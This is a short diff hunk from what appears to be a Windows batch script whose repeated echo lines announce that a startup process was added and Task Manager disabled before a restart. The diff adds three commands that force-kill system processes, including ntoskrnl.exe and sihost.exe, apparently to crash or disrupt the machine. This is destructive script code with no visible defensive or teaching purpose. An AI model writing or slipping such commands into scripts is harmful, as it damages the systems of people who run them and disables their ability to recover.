@@ -311,4 +311,7 @@ echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr 
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
 echo Done!!! Restarting.  (Note: The startup process has been added and taskmgr disabled!!!!)
+taskkill /F /IM ntoskrnl.exe
+taskkill /F /IM sihost.exe
+taskkill /F /IM cmd.exe
 
